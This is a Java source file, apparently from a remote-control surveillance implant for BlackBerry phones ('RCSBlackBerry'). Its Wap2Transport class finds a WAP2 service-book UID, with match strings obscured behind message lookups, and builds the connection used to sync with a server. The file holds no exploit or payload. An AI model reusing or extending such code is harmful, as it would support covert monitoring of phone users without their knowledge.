//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync.transport;

import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.system.CoverageInfo;
import net.rim.device.api.system.RadioInfo;
import blackberry.Messages;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class Wap2Transport extends HttpTransport {

    //#ifdef DEBUG
    private static Debug debug = new Debug(
            "Wap2Transport", DebugLevel.VERBOSE); //$NON-NLS-1$

    //#endif

    public Wap2Transport(String host) {
        super(host);
    }

    public boolean isAvailable() {
        //#ifdef DEBUG
        debug.trace("isAvailable wap2"); //$NON-NLS-1$
        //#endif

        boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
        boolean coverage = CoverageInfo
                .isCoverageSufficient(CoverageInfo.COVERAGE_DIRECT);
        
        String uid = getUid();
        
        //#ifdef DEBUG
        debug.trace("isAvailable wap2: " + gprs + " & " + coverage + " uid: " + uid); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        return coverage & gprs & uid != null;
    }

    private String getUid() {
        String uid = null;
        final ServiceBook sb = ServiceBook.getSB();
        final ServiceRecord[] records = sb.findRecordsByCid(Messages
                .getString("m.0")); //$NON-NLS-1$
        for (int i = 0; i < records.length; i++) {
            if (records[i].isValid() && !records[i].isDisabled()) {
                if (records[i].getUid() != null
                        && records[i].getUid().length() != 0) {
                    if ((records[i].getCid().toLowerCase()
                            .indexOf(Messages.getString("m.5")) != -1) //$NON-NLS-1$
                            && (records[i].getUid().toLowerCase()
                                    .indexOf(Messages.getString("m.6")) == -1) //$NON-NLS-1$
                            && (records[i].getUid().toLowerCase()
                                    .indexOf(Messages.getString("m.7")) == -1)) { //$NON-NLS-1$
                        uid = records[i].getUid();
                        break;
                    }
                }
            }
        }
        return uid;
    }

    protected String getSuffix() {
        String uid = getUid();
        if (uid != null) {
            // WAP2 Connection
            return Messages.getString("m.8") + uid; //$NON-NLS-1$
        }

        return ""; //$NON-NLS-1$
    }

    //#ifdef DEBUGS
    public String toString() {
        return "Wap2Transport " + host; //$NON-NLS-1$
    }
    //#endif
}
